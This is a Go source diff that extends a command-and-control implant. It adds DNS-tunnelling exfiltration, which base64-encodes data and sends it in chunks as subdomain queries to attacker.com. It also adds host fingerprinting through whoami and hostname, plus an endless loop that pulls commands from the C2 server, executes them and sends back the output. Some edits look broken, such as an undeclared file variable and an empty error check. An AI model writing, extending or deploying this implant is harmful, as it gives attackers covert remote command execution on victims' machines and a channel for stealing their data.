@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"context"
 	"crypto/md5"
+	"encoding/base64"
 	"fmt"
 	"net"
 	"os"
@@ -12,6 +13,7 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+	"time"
 )
 
 var (
@@ -19,6 +21,8 @@ var (
 	serverIP = "127.0.0.1"
 	// The C2 server's port
 	serverPort = 5353
+	// The C2 server's domain
+	serverDomain = "attacker.com"
 )
 
 func getdict() map[string]string {
@@ -49,20 +53,23 @@ func getdict() map[string]string {
 			}
 		}
 	}
+
+	// write all the key value pairs from the dictionary to a file
+	file, err = os.Create("dictionary.txt")
+	if err != nil {
+	}
+	defer file.Close()
+
+	for k, v := range dict {
+		file.WriteString(k + ":" + v + "\n")
+	}
+
 	return dict
 }
 
 func mnemonicencode(dict map[string]string, str string) string {
 	fmt.Println(str)
-	out := ""
-
-	for i := 0; i < len(str); i += 3 {
-		if i == len(str)-4 {
-			out += dict[string(str[i])+"   "]
-		} else {
-			out += dict[string(str[i])+string(str[i+1])+string(str[i+2])]
-		}
-	}
+	out := dict[string(str[0])+string(str[1])+string(str[2])]
 
 	return out
 }
@@ -84,9 +91,39 @@ func ipdecode(ips []string) string {
 	return strings.TrimSpace(out)
 }
 
-func queryencode(dict map[string]string, str string) {
-	// Encode the query
-	mnemonicencode(dict, str)
+func pad(tobepadded string) string {
+	// pad to 4 bytes
+	for len(tobepadded)%4 != 0 {
+		tobepadded += " "
+	}
+	return tobepadded
+}
+
+func queryencode(dict map[string]string, str string) []string {
+	str = pad(str)
+	// split str into chunks of 4 characters
+	chunks := make([]string, len(str)/4)
+	for i := 0; i < len(str); i += 4 {
+		chunks[i/4] = str[i : i+4]
+	}
+	// encode each chunk
+	encoded := make([]string, len(chunks))
+	for i, chunk := range chunks {
+		encoded[i] = dict[chunk]
+	}
+
+	return encoded
+}
+
+func exfil(dict map[string]string, str string, uid string) string {
+	str = base64.StdEncoding.EncodeToString([]byte(str))
+	str += "mynuts" + uid
+
+	for _, i := range queryencode(dict, str) {
+		dnsquery(i)
+	}
+
+	return dnsquery(mnemonicencode(dict, "done"))
 }
 
 func dnsquery(query string) string {
@@ -98,7 +135,7 @@ func dnsquery(query string) string {
 			return d.DialContext(ctx, network, fmt.Sprintf("%s:%d", serverIP, serverPort))
 		},
 	}
-	ip, _ := r.LookupHost(context.Background(), fmt.Sprintf("%s.attacker.com", query))
+	ip, _ := r.LookupHost(context.Background(), fmt.Sprintf("%s.%s", query, serverDomain))
 	return ipdecode(ip)
 }
 
@@ -116,7 +153,7 @@ func kill() {
 	syscall.Kill(pid, 9)
 }
 
-func ping(dict map[string]string) {
+func ping(dict map[string]string, uid string) {
 	// Send the ping to the C2 server
 	response := dnsquery("ping")
 	if response == "fingerprint" {
@@ -124,15 +161,18 @@ func ping(dict map[string]string) {
 		switch runtime.GOOS {
 		case "windows":
 			md5sum := md5.New().Sum([]byte(execute("powershell.exe -c \"whoami\"")))
-			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+			uid = fmt.Sprintf("%x", md5sum)
+			fmt.Println(exfil(dict, uid, uid))
 
 		case "linux":
 			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
-			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+			uid = fmt.Sprintf("%x", md5sum)
+			fmt.Println(exfil(dict, uid, uid))
 
 		case "darwin":
 			md5sum := md5.New().Sum([]byte(execute("echo $(whoami)$(hostname)")))
-			fmt.Println(mnemonicencode(dict, fmt.Sprintf("%x\n", md5sum)))
+			uid = fmt.Sprintf("%x", md5sum)
+			fmt.Println(exfil(dict, uid, uid))
 
 		}
 	} else {
@@ -144,5 +184,18 @@ func main() {
 	// Get the dictionary
 	dict := getdict()
 	// Agent for the C2 server
-	ping(dict)
+	uid := ""
+	ping(dict, uid)
+	time.Sleep(time.Second * 10)
+
+	for {
+		// Get the command from the C2 server
+		cmd := exfil(dict, "cmd", uid)
+		// Execute the command
+		out := execute(cmd)
+		// Send the output to the C2 server
+		fmt.Println(exfil(dict, out, uid))
+
+		time.Sleep(time.Second * 1)
+	}
 }
